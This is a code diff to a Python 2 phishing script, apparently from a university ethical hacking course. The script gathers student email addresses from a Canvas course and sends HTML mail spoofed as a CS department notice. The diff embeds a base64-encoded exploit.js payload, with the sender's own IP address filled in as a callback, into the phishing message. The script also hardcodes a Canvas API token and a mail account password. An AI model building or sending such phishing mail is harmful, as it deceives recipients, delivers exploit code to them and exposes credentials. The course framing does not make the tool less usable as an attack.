@@ -8,6 +8,8 @@ import httplib
 import smtplib
 from email.MIMEMultipart import MIMEMultipart
 from email.MIMEText import MIMEText
+from base64 import b64encode
+import socket
 
 ####### HOW TO RUN THIS FILE ###########
 # elit3_h4ck -efile filename.txt        #uses email addresses in text file
@@ -28,6 +30,13 @@ from email.MIMEText import MIMEText
 COURSE_ID = 1195393  #default value for cs378 ethical hacking
 ACCESS_TOKEN = '1017~DSH05LRqWUsyMocT6hCsMHNuX2gA6Yl6NJlt0Zwnsde0uj9xC8bT66YhlmSgva6g'
 email_list = []
+
+# Thank you to https://stackoverflow.com/questions/24196932/how-can-i-get-the-ip-address-of-eth0-in-python
+# for this code
+def get_ip_address():
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    s.connect(("8.8.8.8", 80))
+    return s.getsockname()[0]
 
 def call_canvas(path, request_type='GET', data=None):
     connection = httplib.HTTPSConnection("utexas.instructure.com")
@@ -115,7 +124,7 @@ if args.cid:
 ####################################
 FROM_ADDR = 'eth_hack@hushmail.com'
 PASSWD = 'hacker1234'
-
+OUR_IP = get_ip_address()
 
 for email in email_list:
     print(email)
@@ -123,16 +132,23 @@ for email in email_list:
 msg = MIMEMultipart()
 msg['From'] = 'san@utlists.utexas.edu'
 msg['Subject'] = 'Important Notice From CS Department'
-phish_mail_file = open('phishing_email.txt', 'rb')
-msg.attach(MIMEText(phish_mail_file.read(), 'html'))
-phish_mail_file.close()
+with open('phishing_email.txt', 'rb') as phish_mail_file:
+    with open('exploit.js', 'rb') as exploit_file:
+        exploit_str = exploit_file.read();
+        exploit = b64encode(exploit_str.replace("OUR_IP_ADDRESS_HERE", OUR_IP))
+        raw_phish_html = phish_mail_file.read();
+        phish_html = raw_phish_html.replace("BASE64_EXPLOIT_HERE", exploit);
+        msg.attach(MIMEText(phish_html, 'html'))
+
 
 server = smtplib.SMTP('smtp.hushmail.com', 587)
 server.starttls()
 server.login(FROM_ADDR, PASSWD)
 
 for target in email_list:
+    del msg['To']
     msg['To'] = target
+    print msg.as_string()
     server.sendmail(FROM_ADDR, target, msg.as_string())
 
 server.quit()
